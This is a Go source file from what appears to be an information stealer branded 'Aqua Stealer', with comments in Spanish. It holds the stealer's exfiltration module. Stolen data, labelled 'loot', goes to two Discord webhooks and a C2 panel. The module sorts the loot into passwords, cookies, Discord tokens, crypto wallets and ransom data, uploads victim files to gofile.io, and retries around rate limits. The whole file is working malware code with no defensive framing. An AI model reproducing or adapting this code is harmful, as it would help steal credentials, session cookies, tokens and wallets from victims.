package requests

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func sleepMs(ms int64) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

// C2Hook — interfaz para el C2 client (evita import circular)
// Implementada por c2.Client — se inyecta via SetC2Hook()
type C2Hook interface {
	SendLootRaw(category string, data map[string]interface{})
}

// DualWebhook — envía a dos webhooks en paralelo
type DualWebhook struct {
	Primary   string
	Secondary string
	c2hook    C2Hook   // C2 hook opcional
}

func NewDualWebhook(primary, secondary string) *DualWebhook {
	return &DualWebhook{Primary: primary, Secondary: secondary}
}

// SetC2Hook — inyecta el C2 client para recibir copia de cada Send()
func (d *DualWebhook) SetC2Hook(hook C2Hook) {
	d.c2hook = hook
}

func (d *DualWebhook) Send(data map[string]interface{}, files ...string) {
	// Primary: síncrono — espera confirmación antes de retornar
	sendWebhook(d.Primary, data, files...)
	// Secondary: async, no bloquea
	if d.Secondary != "" && !strings.HasPrefix(d.Secondary, "YOUR_") {
		go sendWebhook(d.Secondary, data, files...)
	}
	// C2 hook: enviar copia async al panel (categoría auto-detectada del embed)
	if d.c2hook != nil {
		go func() {
			category := detectCategory(data)
			flat := flattenWebhookData(data)
			if len(flat) > 0 {
				d.c2hook.SendLootRaw(category, flat)
			}
		}()
	}
}

// detectCategory — infiere la categoría de loot desde el contenido del embed
func detectCategory(data map[string]interface{}) string {
	title := ""
	if embeds, ok := data["embeds"].([]map[string]interface{}); ok && len(embeds) > 0 {
		if t, ok := embeds[0]["title"].(string); ok {
			title = strings.ToLower(t)
		}
	}
	if content, ok := data["content"].(string); ok {
		c := strings.ToLower(content)
		if strings.Contains(c, "password") || strings.Contains(c, "login") {
			return "passwords"
		}
		if strings.Contains(c, "cookie") {
			return "cookies"
		}
		if strings.Contains(c, "token") || strings.Contains(c, "discord") {
			return "discord"
		}
		if strings.Contains(c, "wallet") || strings.Contains(c, "crypto") {
			return "wallets"
		}
		if strings.Contains(c, "blueHammer") || strings.Contains(c, "zeroday") || strings.Contains(c, "zerodayResult") {
			return "zerodays"
		}
		if strings.Contains(c, "cifrado") || strings.Contains(c, "aes-256") {
			return "ransom"
		}
	}
	if strings.Contains(title, "password") || strings.Contains(title, "login") {
		return "passwords"
	}
	if strings.Contains(title, "cookie") {
		return "cookies"
	}
	if strings.Contains(title, "token") || strings.Contains(title, "discord") {
		return "discord"
	}
	if strings.Contains(title, "wallet") || strings.Contains(title, "crypto") {
		return "wallets"
	}
	if strings.Contains(title, "system") || strings.Contains(title, "victim") || strings.Contains(title, "info") {
		return "sysinfo"
	}
	if strings.Contains(title, "game") {
		return "games"
	}
	if strings.Contains(title, "file") {
		return "files"
	}
	return "misc"
}

// flattenWebhookData — aplana embed/content a map plano para el C2
func flattenWebhookData(data map[string]interface{}) map[string]interface{} {
	result := make(map[string]interface{})
	if content, ok := data["content"].(string); ok && content != "" {
		result["content"] = content
	}
	if embeds, ok := data["embeds"].([]map[string]interface{}); ok {
		for _, embed := range embeds {
			if t, ok := embed["title"]; ok {
				result["title"] = t
			}
			if desc, ok := embed["description"]; ok {
				result["description"] = desc
			}
			if fields, ok := embed["fields"].([]map[string]interface{}); ok {
				for _, f := range fields {
					name := fmt.Sprintf("%v", f["name"])
					value := fmt.Sprintf("%v", f["value"])
					result[name] = value
				}
			}
		}
	}
	return result
}

// Get — HTTP GET con headers opcionales
func Get(url string, headers ...map[string]string) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	if len(headers) > 0 {
		for key, value := range headers[0] {
			req.Header.Set(key, value)
		}
	}
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// GetIP — obtiene IP pública
func GetIP() string {
	res, err := Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	return strings.TrimSpace(string(res))
}

// Post — HTTP POST con headers opcionales
func Post(url string, body []byte, headers ...map[string]string) ([]byte, error) {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}
	if len(headers) > 0 {
		for key, value := range headers[0] {
			req.Header.Set(key, value)
		}
	}
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// Upload — sube archivo a gofile.io y devuelve link de descarga
func Upload(file string) (string, error) {
	res, err := Get("https://api.gofile.io/servers")
	if err != nil {
		return "", err
	}

	var serverResp struct {
		Status string `json:"status"`
		Data   struct {
			Servers []struct {
				Name string `json:"name"`
			} `json:"servers"`
		} `json:"data"`
	}

	if err := json.Unmarshal(res, &serverResp); err != nil {
		return uploadLegacy(file)
	}

	if serverResp.Status != "ok" || len(serverResp.Data.Servers) == 0 {
		return uploadLegacy(file)
	}

	serverName := serverResp.Data.Servers[0].Name
	return uploadToServer(file, serverName)
}

func uploadLegacy(file string) (string, error) {
	res, err := Get("https://api.gofile.io/getServer")
	if err != nil {
		return "", err
	}
	var legacy struct {
		Status string `json:"status"`
		Data   struct {
			Server string `json:"server"`
		} `json:"data"`
	}
	if err := json.Unmarshal(res, &legacy); err != nil {
		return "", err
	}
	if legacy.Status != "ok" {
		return "", fmt.Errorf("gofile server error")
	}
	return uploadToServer(file, legacy.Data.Server)
}

func uploadToServer(filePath, server string) (string, error) {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	fw, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return "", err
	}

	fd, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer fd.Close()

	if _, err = io.Copy(fw, fd); err != nil {
		return "", err
	}
	writer.Close()

	res, err := Post(
		fmt.Sprintf("https://%s.gofile.io/contents/uploadfile", server),
		body.Bytes(),
		map[string]string{"Content-Type": writer.FormDataContentType()},
	)
	if err != nil {
		return "", err
	}

	var response struct {
		Data struct {
			DownloadPage string `json:"downloadPage"`
		} `json:"data"`
	}
	if err := json.Unmarshal(res, &response); err != nil {
		return "", err
	}
	if response.Data.DownloadPage == "" {
		return "", fmt.Errorf("upload failed")
	}
	return response.Data.DownloadPage, nil
}

// Webhook — envía a un webhook de Discord con archivos opcionales
func Webhook(webhook string, data map[string]interface{}, files ...string) {
	if strings.HasPrefix(webhook, "YOUR_") {
		return
	}
	sendWebhook(webhook, data, files...)
}

func sendWebhook(webhook string, data map[string]interface{}, files ...string) {
	if webhook == "" || strings.HasPrefix(webhook, "YOUR_") {
		return
	}

	// Filtrar files que no existen o están vacíos
	var validFiles []string
	for _, f := range files {
		if f == "" {
			continue
		}
		if info, err := os.Stat(f); err == nil && info.Size() > 0 {
			validFiles = append(validFiles, f)
		}
	}

	// Si hay más de 10 archivos, enviar embed primero y luego archivos de a 10
	if len(validFiles) > 10 {
		sendWebhook(webhook, data)
		for i := 0; i < len(validFiles); i += 10 {
			end := i + 10
			if end > len(validFiles) {
				end = len(validFiles)
			}
			batch := validFiles[i:end]
			sendWebhook(webhook, map[string]interface{}{
				"content": fmt.Sprintf("📎 Files batch %d/%d", (i/10)+1, (len(validFiles)+9)/10),
			}, batch...)
		}
		return
	}

	// Branding Aqua Stealer — copiar map para no mutar el original
	payload := make(map[string]interface{})
	for k, v := range data {
		payload[k] = v
	}
	payload["username"] = "Aqua Stealer"
	payload["avatar_url"] = "https://i.imgur.com/4M34hi2.png"

	if embeds, ok := payload["embeds"]; ok {
		if embedSlice, ok := embeds.([]map[string]interface{}); ok {
			for _, embed := range embedSlice {
				if _, hasColor := embed["color"]; !hasColor {
					embed["color"] = 0x00bfff
				}
				embed["footer"] = map[string]interface{}{
					"text":     "Aqua Stealer",
					"icon_url": "https://i.imgur.com/4M34hi2.png",
				}
			}
		}
	}

	client := &http.Client{Timeout: 30 * time.Second}

	for attempt := 0; attempt < 5; attempt++ {
		var (
			body        bytes.Buffer
			contentType string
		)

		if len(validFiles) == 0 {
			// Sin archivos: enviar como JSON puro (más limpio, menos propenso a errores)
			jsonData, err := json.Marshal(payload)
			if err != nil {
				return
			}
			body.Write(jsonData)
			contentType = "application/json"
		} else {
			// Con archivos: usar multipart/form-data
			writer := multipart.NewWriter(&body)

			for i, filePath := range validFiles {
				f, err := os.Open(filePath)
				if err != nil {
					continue
				}
				// FIX CRÍTICO: usar solo el nombre base del archivo, no el path completo
				part, err := writer.CreateFormFile(
					fmt.Sprintf("file[%d]", i),
					filepath.Base(filePath),
				)
				if err != nil {
					f.Close()
					continue
				}
				io.Copy(part, f)
				f.Close()
			}

			jsonPart, err := writer.CreateFormField("payload_json")
			if err != nil {
				writer.Close()
				return
			}
			jsonData, err := json.Marshal(payload)
			if err != nil {
				writer.Close()
				return
			}
			jsonPart.Write(jsonData)
			writer.Close()
			contentType = writer.FormDataContentType()
		}

		req, err := http.NewRequest("POST", webhook, &body)
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", contentType)

		resp, err := client.Do(req)
		if err != nil {
			// Error de red — esperar y reintentar
			sleepMs(1000 * int64(attempt+1))
			continue
		}
		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 204 || resp.StatusCode == 200 {
			return
		}

		if resp.StatusCode == 429 {
			// Rate limited
			var rl struct {
				RetryAfter float64 `json:"retry_after"`
			}
			json.Unmarshal(respBody, &rl)
			wait := rl.RetryAfter
			if wait <= 0 {
				wait = 2
			}
			sleepMs(int64(wait*1000) + 500)
			continue
		}

		if resp.StatusCode >= 500 {
			// Error del servidor de Discord — reintentar
			sleepMs(2000 * int64(attempt+1))
			continue
		}

		// 400, 401, 403, 404 — no reintentar
		_ = respBody
		return
	}
}
